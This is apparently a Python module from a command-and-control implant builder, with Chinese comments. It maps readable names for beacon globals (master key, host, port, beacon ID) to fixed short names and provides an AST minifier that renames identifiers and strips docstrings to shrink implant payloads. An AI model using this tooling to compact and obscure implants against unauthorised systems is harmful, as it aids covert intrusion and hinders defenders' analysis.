"""server/implant/names.py — 短名契约 + 构建期 minifier。

D2 短名契约从"散落在 docstring 里"收敛为这里的一张映射表：implant 模板
用可读名书写，build.py 渲染后经 minify() 改回短名。模块代码（server/modules/）
直接使用短名，短名即本表 CONTRACT 的 value——改契约只改这一处。

minify() 只重命名标识符（tokenize 识别 NAME token），字符串/注释/数字
不受影响；非契约标识符（局部变量）被分配唯一短名，保证不引入遮蔽。
"""

import ast
import builtins
import io
import keyword
import string

# readable → 固定短名（三端共享：implant 产物 / 模块代码 / 测试假 beacon）
CONTRACT = {
    # 模块别名
    "sock": "a", "st": "b", "zl": "c", "b64": "d", "rnd": "e",
    "tm": "f", "js": "g", "sy": "i", "tb": "j", "io_": "k",
    "sec": "l", "thr": "t2", "hl": "h", "hmac_": "hm",
    # 全局
    "MASTER_KEY": "_K", "HOST": "_H", "PORT": "_P", "INTERVAL": "_I",
    "JITTER": "_J", "BEACON_ID": "_D", "BREAK_FLAG": "_B",
    # 帧加密密钥变量(minify 后避开 _CK:模板源码同时存在"逻辑连接密钥 _CK"
    # 与"帧密钥 CONN_KEY",CONTRACT 若把 CONN_KEY 也映射成 _CK,cycle 的
    # CONN_KEY=_CK 同步行在 minify 产物里变成 _CK=_CK 语义翻转——uplevel
    # 注入代码(_disp)写 _CK 设的是帧密钥本身,随后被 cycle 重置回部署密钥,
    # 升级通道帧密钥永远错位(2026-09-04 修复:帧密钥映射独立短名 _F,
    # _CK 锁定为逻辑密钥名,未 minify/minify 两形态同构))
    "CONN_KEY": "_F", "_CK": "_CK", "PRINT_LOCK": "_L",
    # 函数
    "connect_transport": "_T", "send_frame": "p", "recv_frame": "q",
    "exec_task": "r", "sleep_jitter": "s", "qround": "Q",
    "block": "B", "xor_stream": "X", "encode_frame_": "n",
    "decode_frame_": "o", "cycle": "cyc",
    # 模板全局中植入模块直接引用的名字 → 保持原名(模块代码 exec 在植入物
    # 全局里,只能按原名访问;minify 不能把它们池化成随机短名,否则
    # fork/shell/kill_task/record 等模块在压缩版植入物上 NameError,
    # 2026-08-27 修复)
    "_TLS": "_TLS", "_cancel_task": "_cancel_task",
    "_RECORDS": "_RECORDS", "_RECORDS_LOCK": "_RECORDS_LOCK",
}

_KEYWORDS = set(keyword.kwlist)
_BUILTINS = set(dir(builtins))
# 不重命名的标识符（关键字 + 内置名）
_SKIP = _KEYWORDS | _BUILTINS
# 池子不分配的名字（关键字 + 内置名 + 契约短名，避免遮蔽）
_POOL_EXCLUDE = _SKIP | set(CONTRACT.values())


def _name_pool():
    chars = string.ascii_letters + "_"
    for ch in chars:
        yield ch
    for a in chars:
        for b in chars:
            yield a + b


def minify(source: str) -> str:
    """可读源码 → 短名产物。契约名走 CONTRACT，其余分配唯一短名。

    基于 AST：只改 Name / 函数名 / 参数名 / import 别名 / global 名，
    属性名（secrets.token_hex）、模块名（import socket）、字符串/数字
    天然不受影响。
    """
    tree = ast.parse(source)
    rename = {}
    pool = _name_pool()

    def short(name: str) -> str:
        if name in CONTRACT:
            return CONTRACT[name]
        if name not in rename:
            s = next(pool)
            while s in _POOL_EXCLUDE or s in rename.values():
                s = next(pool)
            rename[name] = s
        return rename[name]

    class _T(ast.NodeTransformer):
        def visit_Name(self, node):
            if node.id not in _SKIP and not (node.id.startswith("__") and node.id.endswith("__")):
                node.id = short(node.id)
            return node

        def visit_arg(self, node):
            node.arg = short(node.arg)
            return node

        def visit_FunctionDef(self, node):
            if not (node.name.startswith("__") and node.name.endswith("__")):
                # 方法(self 首参)不重命名——外部 obj.write() 属性调用不受
                # AST 重命名影响,方法名改了会 AttributeError
                args = node.args.args
                if not (args and args[0].arg == "self"):
                    node.name = short(node.name)
            self.generic_visit(node)
            return node

        def visit_ClassDef(self, node):
            # ⚠️ 缺这个会类定义名保留、类名引用被重命名 → NameError
            # (class _ThreadStream vs ao('out'))——minify 植入物端到端跑不了
            node.name = short(node.name)
            self.generic_visit(node)
            return node

        def visit_alias(self, node):
            if node.asname:
                node.asname = short(node.asname)
            return node

        def visit_Global(self, node):
            node.names = [short(n) for n in node.names]
            return node

    class _Doc(ast.NodeTransformer):
        """剥离模块级/函数级 docstring(unparse 不保留注释, docstring 是
        Expr(Constant) 会被保留——载荷体积优化: 一并删掉)。"""

        def _strip(self, body):
            if (body and isinstance(body[0], ast.Expr)
                    and isinstance(body[0].value, ast.Constant)
                    and isinstance(body[0].value.value, str)):
                body.pop(0)
            return body

        def visit_Module(self, node):
            node.body = self._strip(node.body)
            return self.generic_visit(node)

        def visit_FunctionDef(self, node):
            node.body = self._strip(node.body)
            return self.generic_visit(node)

        visit_AsyncFunctionDef = visit_FunctionDef
        visit_ClassDef = visit_FunctionDef

    tree = _T().visit(tree)
    tree = _Doc().visit(tree)   # 删 docstring(载荷瘦身)
    ast.fix_missing_locations(tree)
    return ast.unparse(tree)
